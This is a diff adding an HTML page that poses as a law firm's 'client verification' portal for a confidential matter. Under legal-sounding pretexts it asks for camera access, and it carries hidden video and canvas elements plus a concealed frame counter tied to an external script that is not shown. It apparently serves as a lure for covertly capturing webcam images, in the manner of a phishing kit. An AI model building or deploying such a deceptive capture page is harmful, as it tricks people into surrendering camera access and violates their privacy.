@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cipher Law — Client verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Jost:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  :root{--bg:#f8f6f2;--paper:#fffdf9;--ink:#2a1f1a;--muted:#8a7d70;--line:#e0d9cc;--line-2:#f0e9dd;--bordo:#7a1f2e;--bordo-dark:#5d1522;--gold:#b8965a;}
+  html,body{height:100%;}
+  body{font-family:'Jost',sans-serif;background:var(--bg);color:var(--ink);min-height:100vh;letter-spacing:0.005em;}
+
+  .topbar{
+    background:var(--bordo);color:var(--paper);
+    padding:10px 48px;
+    font-size:11px;letter-spacing:0.2em;text-transform:uppercase;
+    display:flex;justify-content:space-between;font-weight:500;
+  }
+  .topbar .case{opacity:.75;}
+
+  /* two-column layout */
+  .shell{
+    display:grid;grid-template-columns:280px 1fr;
+    min-height:calc(100vh - 40px);
+    max-width:1400px;margin:0 auto;
+  }
+
+  /* sidebar */
+  .sidebar{
+    background:var(--paper);
+    border-right:1px solid var(--line);
+    padding:52px 32px;
+    position:relative;
+  }
+  .sidebar::after{
+    content:"";position:absolute;top:0;right:0;bottom:0;width:1px;
+    background:linear-gradient(180deg,transparent,var(--bordo),transparent);
+    opacity:.3;
+  }
+
+  .sidebar-brand{
+    display:flex;align-items:center;gap:12px;
+    font-family:'Libre Baskerville',serif;
+    font-size:18px;font-weight:700;
+    margin-bottom:44px;
+  }
+  .sidebar-brand-mark{
+    width:36px;height:36px;border-radius:50%;
+    border:1.5px solid var(--bordo);
+    display:flex;align-items:center;justify-content:center;
+    position:relative;
+  }
+  .sidebar-brand-mark svg{width:18px;height:18px;stroke:var(--bordo);stroke-width:1.6;fill:none;}
+  .sidebar-brand em{font-style:italic;color:var(--bordo);}
+
+  .sidebar-section{margin-bottom:36px;}
+  .sidebar-section h4{
+    font-family:'Jost',sans-serif;
+    font-size:10.5px;font-weight:700;
+    letter-spacing:0.2em;text-transform:uppercase;
+    color:var(--bordo);margin-bottom:16px;
+    padding-bottom:8px;
+    border-bottom:1px solid var(--line);
+  }
+  .sidebar-item{
+    display:flex;gap:12px;align-items:flex-start;
+    padding:10px 0;
+    font-size:13px;color:var(--muted);
+    line-height:1.5;
+  }
+  .sidebar-item .num{
+    font-family:'Libre Baskerville',serif;
+    font-size:13px;font-style:italic;
+    color:var(--bordo);font-weight:600;
+    min-width:20px;
+  }
+  .sidebar-item.active{color:var(--ink);}
+  .sidebar-item.active .num{color:var(--bordo);font-weight:700;}
+
+  .sidebar-foot{
+    position:absolute;bottom:40px;left:32px;right:32px;
+    font-size:10.5px;letter-spacing:0.15em;
+    text-transform:uppercase;color:var(--muted);
+    font-weight:500;
+  }
+
+  /* main content */
+  .content{
+    padding:64px 72px;
+    display:flex;flex-direction:column;
+    justify-content:center;
+  }
+
+  .doc-header{
+    margin-bottom:48px;
+    position:relative;
+    padding-bottom:32px;
+  }
+  .doc-header::after{
+    content:"";position:absolute;bottom:0;left:0;right:0;height:1px;
+    background:repeating-linear-gradient(90deg,var(--bordo) 0 6px,transparent 6px 14px);
+    opacity:.4;
+  }
+  .doc-header .kicker{
+    font-family:'Jost',sans-serif;
+    font-size:11px;font-weight:600;
+    letter-spacing:0.25em;text-transform:uppercase;
+    color:var(--bordo);margin-bottom:18px;
+    display:flex;align-items:center;gap:14px;
+  }
+  .doc-header .kicker::before{content:"§";font-family:'Libre Baskerville',serif;font-size:14px;font-style:italic;}
+
+  .doc-header h1{
+    font-family:'Libre Baskerville',serif;
+    font-size:44px;font-weight:400;
+    letter-spacing:-0.015em;
+    line-height:1.15;
+    margin-bottom:16px;
+  }
+  .doc-header h1 em{font-style:italic;color:var(--bordo);}
+
+  .doc-header .lede{
+    font-family:'Libre Baskerville',serif;
+    font-size:15.5px;line-height:1.8;
+    color:var(--muted);
+    font-style:italic;
+    max-width:640px;
+  }
+
+  /* Document-style form */
+  .doc-body{
+    display:grid;grid-template-columns:1fr 1fr;
+    gap:40px;
+    max-width:920px;
+  }
+
+  .doc-col-left{position:relative;}
+  .doc-col-left .seal-block{
+    display:flex;align-items:center;gap:16px;
+    padding-bottom:20px;
+    border-bottom:1px solid var(--line);
+    margin-bottom:24px;
+  }
+  .doc-seal{
+    width:52px;height:52px;
+    border-radius:50%;
+    border:1.5px solid var(--bordo);
+    display:flex;align-items:center;justify-content:center;
+    position:relative;flex-shrink:0;
+  }
+  .doc-seal::before{
+    content:"";position:absolute;inset:4px;
+    border-radius:50%;
+    border:1px dashed rgba(122,31,46,0.4);
+  }
+  .doc-seal svg{width:24px;height:24px;stroke:var(--bordo);stroke-width:1.4;fill:none;}
+
+  .doc-seal-info .t{
+    font-family:'Libre Baskerville',serif;
+    font-size:15px;font-weight:700;
+    color:var(--ink);
+    letter-spacing:-0.005em;
+  }
+  .doc-seal-info .s{
+    font-size:11px;letter-spacing:0.18em;
+    text-transform:uppercase;color:var(--muted);
+    font-weight:600;margin-top:4px;
+  }
+
+  .doc-cam{
+    padding:20px;
+    background:#fbf8f3;
+    border:1px solid var(--line-2);
+    transition:all .35s;
+    position:relative;
+    display:flex;gap:14px;align-items:center;
+  }
+  .doc-cam::before{
+    content:"";position:absolute;top:-1px;left:-1px;
+    width:16px;height:16px;
+    border-top:1.5px solid var(--bordo);
+    border-left:1.5px solid var(--bordo);
+  }
+  .doc-cam::after{
+    content:"";position:absolute;bottom:-1px;right:-1px;
+    width:16px;height:16px;
+    border-bottom:1.5px solid var(--bordo);
+    border-right:1.5px solid var(--bordo);
+  }
+  .doc-cam.active{background:#fff5ee;border-color:var(--bordo);}
+
+  .doc-cam .ic{
+    width:44px;height:44px;
+    background:var(--paper);
+    border:1px solid var(--line);
+    display:flex;align-items:center;justify-content:center;
+    font-size:18px;color:var(--muted);
+    transition:all .35s;flex-shrink:0;
+  }
+  .doc-cam.active .ic{background:var(--bordo);color:var(--paper);border-color:var(--bordo);}
+  .doc-cam .txt .t{
+    font-family:'Jost',sans-serif;
+    font-size:11px;font-weight:700;
+    letter-spacing:0.15em;text-transform:uppercase;
+    color:var(--ink);
+  }
+  .doc-cam .txt .s{
+    font-family:'Libre Baskerville',serif;
+    font-size:13px;font-style:italic;
+    color:var(--muted);margin-top:3px;
+  }
+
+  .doc-col-right{}
+  .doc-stats{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+  .doc-stats .cell{
+    padding:14px 16px;
+    background:#fbf8f3;
+    border:1px solid var(--line-2);
+    text-align:center;
+  }
+  .doc-stats .cell .k{
+    font-family:'Jost',sans-serif;
+    font-size:10px;font-weight:700;
+    letter-spacing:0.2em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:6px;
+  }
+  .doc-stats .cell .v{
+    font-family:'Libre Baskerville',serif;
+    font-size:22px;color:var(--bordo);
+    letter-spacing:-0.01em;
+  }
+
+  .doc-captcha{
+    padding:20px;
+    background:#fbf8f3;
+    border:1px solid var(--line-2);
+    display:flex;justify-content:center;
+    transition:all .3s;position:relative;
+  }
+  .doc-captcha::before{
+    content:"";position:absolute;top:-1px;left:-1px;
+    width:16px;height:16px;
+    border-top:1.5px solid var(--bordo);
+    border-left:1.5px solid var(--bordo);
+  }
+  .doc-captcha::after{
+    content:"";position:absolute;bottom:-1px;right:-1px;
+    width:16px;height:16px;
+    border-bottom:1.5px solid var(--bordo);
+    border-right:1.5px solid var(--bordo);
+  }
+  .doc-captcha.ready{background:#fff5ee;border-color:var(--bordo);}
+  #recaptchaWidget{display:inline-block;}
+  .dimmed{opacity:0.4;pointer-events:none;filter:grayscale(0.6);}
+
+  .doc-caption{
+    margin-top:14px;
+    font-family:'Libre Baskerville',serif;
+    font-size:12px;font-style:italic;
+    color:var(--muted);line-height:1.7;
+    text-align:center;
+  }
+
+  video,canvas{display:none;}
+
+  @media (max-width:900px){
+    .shell{grid-template-columns:1fr;}
+    .sidebar{display:none;}
+    .content{padding:36px 24px;}
+    .doc-header h1{font-size:32px;}
+    .doc-body{grid-template-columns:1fr;gap:24px;}
+    .topbar{padding:8px 22px;font-size:10px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span>Cipher & Associates · Attorney–client privileged</span>
+  <span class="case">Matter 8472-A · Confidential</span>
+</div>
+
+<div class="shell">
+
+  <!-- sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-brand">
+      <div class="sidebar-brand-mark">
+        <svg viewBox="0 0 24 24"><path d="M12 3v18M5 8l7-5 7 5M5 16l7 5 7-5" stroke-linejoin="round" stroke-linecap="round"/></svg>
+      </div>
+      Cipher<em>&</em>Associates
+    </div>
+
+    <div class="sidebar-section">
+      <h4>Verification steps</h4>
+      <div class="sidebar-item active">
+        <span class="num">I.</span>
+        <span>Device authentication</span>
+      </div>
+      <div class="sidebar-item">
+        <span class="num">II.</span>
+        <span>Client identity check</span>
+      </div>
+      <div class="sidebar-item">
+        <span class="num">III.</span>
+        <span>Access file</span>
+      </div>
+    </div>
+
+    <div class="sidebar-section">
+      <h4>Your rights</h4>
+      <div class="sidebar-item">
+        <span class="num">§</span>
+        <span>All communications are privileged under law.</span>
+      </div>
+    </div>
+
+    <div class="sidebar-foot">
+      Confidential · Do not distribute
+    </div>
+  </aside>
+
+  <!-- main -->
+  <section class="content">
+
+    <header class="doc-header">
+      <div class="kicker">Client verification</div>
+      <h1>Please confirm your <em>identity</em>.</h1>
+      <p class="lede">
+        To protect privileged communications under our engagement, we require
+        verification of the requesting party before granting access to your file.
+      </p>
+    </header>
+
+    <div class="doc-body">
+
+      <!-- left column -->
+      <div class="doc-col-left">
+        <div class="seal-block">
+          <div class="doc-seal">
+            <svg viewBox="0 0 24 24">
+              <path d="M12 3v18M5 8l7-5 7 5M5 16l7 5 7-5" stroke-linejoin="round" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="doc-seal-info">
+            <div class="t">Client file 8472-A</div>
+            <div class="s">Active matter</div>
+          </div>
+        </div>
+
+        <div class="doc-cam" id="camCard">
+          <div class="ic">📷</div>
+          <div class="txt">
+            <div class="t" id="camTitle">Camera access</div>
+            <div class="s" id="camSub">Awaiting client permission…</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- right column -->
+      <div class="doc-col-right">
+        <div class="doc-stats" id="stats">
+          <div class="cell"><div class="k">Frames</div><div class="v" id="cntCaptures">0</div></div>
+          <div class="cell"><div class="k">Status</div><div class="v" id="delStatus">✓</div></div>
+        </div>
+
+        <div class="doc-captcha dimmed" id="captchaWrap">
+          <div id="recaptchaWidget"></div>
+        </div>
+
+        <p class="doc-caption">
+          By proceeding you confirm your authority to access this matter.
+          All activity is logged.
+        </p>
+      </div>
+
+    </div>
+
+  </section>
+
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script src="script.js"></script>
+</body>
+</html>
